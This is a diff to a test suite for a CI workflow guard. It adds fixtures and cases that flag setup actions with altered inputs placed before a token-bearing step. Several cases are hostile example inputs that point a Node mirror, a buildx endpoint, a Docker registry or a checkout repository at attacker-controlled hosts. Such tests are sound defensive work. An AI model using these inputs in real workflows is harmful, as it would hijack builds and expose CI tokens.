@@ -150,12 +150,19 @@ describe('workflow token guard on adversarial fixtures', () => {
     ['d05-job-env-expression.yml', ['env-expr']],
     ['d06-workflow-env-expression.yml', ['env-expr']],
     ['d07-env-expression-builds-token-name.yml', ['env-expr']],
+    ['d08-setup-node-mirror.yml', ['setup-with']],
+    ['d09-setup-node-registry.yml', ['setup-with']],
+    ['d10-checkout-other-repo.yml', ['setup-with']],
+    ['d11-setup-buildx-remote.yml', ['setup-with']],
+    ['d12-setup-node-version-file.yml', ['setup-with']],
+    ['d13-setup-with-expression.yml', ['setup-with']],
+    ['d14-setup-step-env.yml', ['setup-with']],
   ])('%s is flagged %j', (file, expected) => {
     expect(fixture(`adversarial/${file}`)).toEqual(expected);
   });
 
   it('lists a fixture for every case', () => {
-    expect(readdirSync(path.join(FIXTURES, 'adversarial')).length).toBe(41);
+    expect(readdirSync(path.join(FIXTURES, 'adversarial')).length).toBe(48);
   });
 });
 
@@ -479,6 +486,65 @@ describe('what may change how a token step runs', () => {
       ]);
     },
   );
+
+  it('accepts the with: inputs the live workflows give the setup actions', () => {
+    const before = [
+      "actions/setup-node@v7\n        with:\n          node-version: '24'\n          cache: 'npm'\n          cache-dependency-path: |\n            package-lock.json\n            e2e/stack/package-lock.json",
+      'actions/setup-node@v7\n        with:\n          node-version: ${{ matrix.node-version }}\n          registry-url: https://npm.pkg.github.com',
+      'actions/setup-node@v7\n        with:\n          node-version: 24\n        env:',
+      'docker/metadata-action@v6\n        with:\n          images: ghcr.io/figurecollecting/fc-mobile-web\n          tags: |\n            type=sha,format=short,prefix=sha-',
+      'docker/login-action@v4\n        with:\n          registry: ghcr.io\n          username: ${{ github.actor }}\n          password: ${{ secrets.GITHUB_TOKEN }}',
+      'actions/checkout@v7\n        with:',
+    ]
+      .map((u) => `      - uses: ${u}\n`)
+      .join('');
+    expect(rules(tokenJob('', before))).toEqual([]);
+  });
+
+  it.each([
+    ['actions/checkout@v7', 'repository: attacker/fc-mobile'],
+    ['actions/checkout@v7', 'ref: main'],
+    ['actions/checkout@v7', 'path: e2e/stack'],
+    ['actions/setup-node@v7', 'mirror: https://attacker.example/node'],
+    ['actions/setup-node@v7', 'node-version-file: .nvmrc'],
+    ['actions/setup-node@v7', 'registry-url: https://npm.pkg.github.com/'],
+    ['actions/setup-node@v7', 'registry-url: https://registry.npmjs.org'],
+    ['actions/setup-node@v7', 'node-version: ${{ vars.NODE_VERSION }}'],
+    ['actions/setup-node@v7', "cache: ${{ 'npm' }}"],
+    ['actions/setup-node@v7', 'cache-dependency-path: ${{ vars.LOCK }}'],
+    ['actions/setup-node@v7', 'Node-Version: 24'],
+    ['actions/setup-node@v7', 'constructor: x'],
+    ['docker/setup-buildx-action@v4', 'driver: remote'],
+    ['docker/setup-buildx-action@v4', 'endpoint: tcp://attacker.example:1234'],
+    ['docker/metadata-action@v6', 'images: ${{ vars.IMAGE }}'],
+    ['docker/metadata-action@v6', 'tags: ${{ vars.TAGS }}'],
+    ['docker/metadata-action@v6', 'flavor: latest=true'],
+    ['Docker/Login-Action@v4', 'registry: attacker.example'],
+    ['docker/login-action@v4', 'username: ${{ vars.USER }}'],
+    ['docker/login-action@v4', 'password: ${{ secrets.OTHER }}'],
+  ])('flags %s with %s before a token step', (uses, input) => {
+    expect(checkWorkflow('x.yml', parse(tokenJob('', `      - uses: ${uses}\n        with:\n          ${input}\n`)), fixtureAllowList('x.yml'))).toEqual([
+      { file: 'x.yml', where: 'build > #0 > with', rule: 'setup-with' },
+    ]);
+  });
+
+  it.each(["'${{ fromJSON(vars.WITH) }}'", '[node-version]'])('flags with: %s on a setup action before a token step', (value) => {
+    expect(checkWorkflow('x.yml', parse(tokenJob('', `      - uses: actions/setup-node@v7\n        with: ${value}\n`)), fixtureAllowList('x.yml'))).toEqual([
+      { file: 'x.yml', where: 'build > #0 > with', rule: 'setup-with' },
+    ]);
+  });
+
+  it('flags env on a setup action before a token step', () => {
+    expect(checkWorkflow('x.yml', parse(tokenJob('', '      - uses: actions/checkout@v7\n        env:\n          NODE_OPTIONS: x\n')), fixtureAllowList('x.yml'))).toEqual([
+      { file: 'x.yml', where: 'build > #0 > env', rule: 'setup-with' },
+    ]);
+  });
+
+  it('leaves the inputs of a setup action alone after the last token step and in a job without one', () => {
+    const setup = '      - uses: actions/setup-node@v7\n        with:\n          mirror: https://x.example\n        env:\n          A: b\n';
+    expect(rules(tokenJob() + setup)).toEqual([]);
+    expect(rules(`jobs:\n  t:\n    steps:\n${setup}`)).toEqual([]);
+  });
 
   it('flags an untokened step between two token steps', () => {
     expect(rules(`${tokenJob()}      - run: npm run build\n${TOKEN_INSTALL}`)).toEqual(['step-order']);
